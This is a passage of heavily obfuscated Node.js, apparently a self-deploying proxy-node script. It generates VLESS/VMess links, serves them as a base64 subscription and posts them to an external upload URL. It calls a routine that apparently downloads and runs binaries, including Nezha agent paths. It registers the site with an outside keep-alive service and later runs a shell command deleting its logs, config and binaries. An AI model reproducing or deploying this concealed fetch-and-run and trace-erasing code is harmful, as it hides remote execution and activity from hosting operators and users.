_0x1aa56a={_0x405c49:0x132,_0x5e5da4:0xcf,_0x2980fb:0x12f,_0x29e693:0xce,_0x326ae7:0xd7,_0x580e44:0xf4,_0x8d4c54:0x10a,_0x9b44fe:0xd7,_0x470d9b:0x10e,_0x3bc88f:0xdf},_0x5e4cd6=await _0x468c7d(),_0xf1f0fd=NAME?NAME+'-'+_0x5e4cd6:_0x5e4cd6;return new Promise(_0xb60e2b=>{const _0x283460={_0x25ee0e:0x116,_0x4b476d:0x108,_0x1a7d31:0x96};setTimeout(()=>{const _0x2ac920=_0x3b52,_0x41b439={'v':'2','ps':''+_0xf1f0fd,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2ac920(0x135),'net':'ws','type':'none','host':_0x40fb44,'path':_0x2ac920(0xc5),'tls':_0x2ac920(0x88),'sni':_0x40fb44,'alpn':'','fp':_0x2ac920(_0x1aa56a._0x405c49)},_0x38b26a='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x2ac920(_0x1aa56a._0x5e5da4)+_0x40fb44+'&fp=firefox&type=ws&host='+_0x40fb44+_0x2ac920(_0x1aa56a._0x2980fb)+_0xf1f0fd+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x2ac920(_0x1aa56a._0x29e693)](_0x41b439))[_0x2ac920(0x131)](_0x2ac920(_0x1aa56a._0x326ae7))+_0x2ac920(0xc7)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x40fb44+_0x2ac920(0xfd)+_0x40fb44+_0x2ac920(_0x1aa56a._0x580e44)+_0xf1f0fd+_0x2ac920(0x12e);console[_0x2ac920(_0x1aa56a._0x8d4c54)](Buffer['from'](_0x38b26a)[_0x2ac920(0x131)](_0x2ac920(_0x1aa56a._0x9b44fe))),fs[_0x2ac920(_0x1aa56a._0x470d9b)](subPath,Buffer['from'](_0x38b26a)[_0x2ac920(0x131)]('base64')),console[_0x2ac920(0x10a)](FILE_PATH+_0x2ac920(_0x1aa56a._0x3bc88f)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x396796,_0x385627)=>{const _0xfc0efa=_0x2ac920,_0x4a214d=Buffer[_0xfc0efa(_0x283460._0x25ee0e)](_0x38b26a)[_0xfc0efa(0x131)](_0xfc0efa(0xd7));_0x385627[_0xfc0efa(_0x283460._0x4b476d)](_0xfc0efa(0xdd),_0xfc0efa(_0x283460._0x1a7d31)),_0x385627[_0xfc0efa(0xe4)](_0x4a214d);}),_0xb60e2b(_0x38b26a);},0x7d0);});}}async function uploadNodes(){const _0x458f1a={_0x174bec:0x11f,_0x3694b3:0x117,_0x1d201b:0x10a,_0x5b9c75:0x125,_0x561938:0xce,_0x1f08f4:0x101,_0x119e31:0x9d},_0x4c0b8c=_0x5085e4;if(UPLOAD_URL&&PROJECT_URL){const _0x224fe4=PROJECT_URL+'/'+SUB_PATH,_0x37adba={'subscription':[_0x224fe4]};try{const _0x13be98=await axios[_0x4c0b8c(_0x458f1a._0x174bec)](UPLOAD_URL+'/api/add-subscriptions',_0x37adba,{'headers':{'Content-Type':'application/json'}});return _0x13be98&&_0x13be98[_0x4c0b8c(_0x458f1a._0x3694b3)]===0xc8?(console[_0x4c0b8c(_0x458f1a._0x1d201b)](_0x4c0b8c(0x134)),_0x13be98):null;}catch(_0x5785ea){if(_0x5785ea[_0x4c0b8c(0xa8)]){if(_0x5785ea[_0x4c0b8c(0xa8)][_0x4c0b8c(0x117)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4c0b8c(0x103)](listPath))return;const _0x34a06b=fs['readFileSync'](listPath,_0x4c0b8c(_0x458f1a._0x5b9c75)),_0x1ca186=_0x34a06b[_0x4c0b8c(0x10c)]('\x0a')[_0x4c0b8c(0x9e)](_0x3eb1f0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3eb1f0));if(_0x1ca186['length']===0x0)return;const _0xe42a83=JSON[_0x4c0b8c(_0x458f1a._0x561938)]({'nodes':_0x1ca186});try{const _0x57afc5=await axios[_0x4c0b8c(0x11f)](UPLOAD_URL+_0x4c0b8c(0xbd),_0xe42a83,{'headers':{'Content-Type':_0x4c0b8c(_0x458f1a._0x1f08f4)}});return _0x57afc5&&_0x57afc5[_0x4c0b8c(_0x458f1a._0x3694b3)]===0xc8?(console[_0x4c0b8c(_0x458f1a._0x1d201b)](_0x4c0b8c(_0x458f1a._0x119e31)),_0x57afc5):null;}catch(_0x84b4eb){return null;}}else return;}}function cleanFiles(){const _0x34a83b={_0x4b4e27:0x130,_0x1114db:0x111,_0x1df7a5:0x105,_0x55f18a:0xa4,_0xf54182:0xec,_0x132479:0xc4},_0x338a66={_0x383eb3:0x127},_0x293760={_0x54074d:0x10a};setTimeout(()=>{const _0x3d19db=_0x3b52,_0x61f2c1=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x61f2c1[_0x3d19db(0x130)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x61f2c1[_0x3d19db(_0x34a83b._0x4b4e27)](phpPath);process[_0x3d19db(_0x34a83b._0x1114db)]===_0x3d19db(0x98)?exec(_0x3d19db(_0x34a83b._0x1df7a5)+_0x61f2c1[_0x3d19db(_0x34a83b._0x55f18a)]('\x20')+_0x3d19db(_0x34a83b._0xf54182),_0x236096=>{const _0x215fba=_0x3d19db;console[_0x215fba(0x13c)](),console['log'](_0x215fba(0x86)),console[_0x215fba(_0x293760._0x54074d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x3d19db(_0x34a83b._0x132479)+_0x61f2c1['join']('\x20')+_0x3d19db(0xf1),_0x29f9d2=>{const _0x3ec5e6=_0x3d19db;console[_0x3ec5e6(0x13c)](),console['log'](_0x3ec5e6(0x86)),console[_0x3ec5e6(0x10a)](_0x3ec5e6(_0x338a66._0x383eb3));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x435f48={_0x136736:0x10a,_0xa80fd1:0x11f,_0x436b21:0xb1},_0x13afb9=_0x5085e4;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x13afb9(_0x435f48._0x136736)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x21160f=await axios[_0x13afb9(_0x435f48._0xa80fd1)](_0x13afb9(0xb7),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x13afb9(_0x435f48._0x436b21)),_0x21160f;}catch(_0xf53f27){return console[_0x13afb9(0x12a)](_0x13afb9(0x9b)+_0xf53f27[_0x13afb9(0x82)]),null;}}async function startserver(){const _0x3ccd8c={_0x28b7e:0x120},_0x381fe5=_0x5085e4;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2b6df0){console[_0x381fe5(0x12a)](_0x381fe5(_0x3ccd8c._0x28b7e),_0x2b6df0);}}startserver()[_0x5085e4(0x142)](_0x40517c=>{const _0x587365={_0x3e84ea:0xfc},_0x487455=_0x5085e4;console['error'](_0x487455(_0x587365._0x3e84ea),_0x40517c);}),app[_0x5085e4(0xe2)](PORT,()=>console[_0x5085e4(0x10a)](_0x5085e4(0x141)+PORT+'!'));
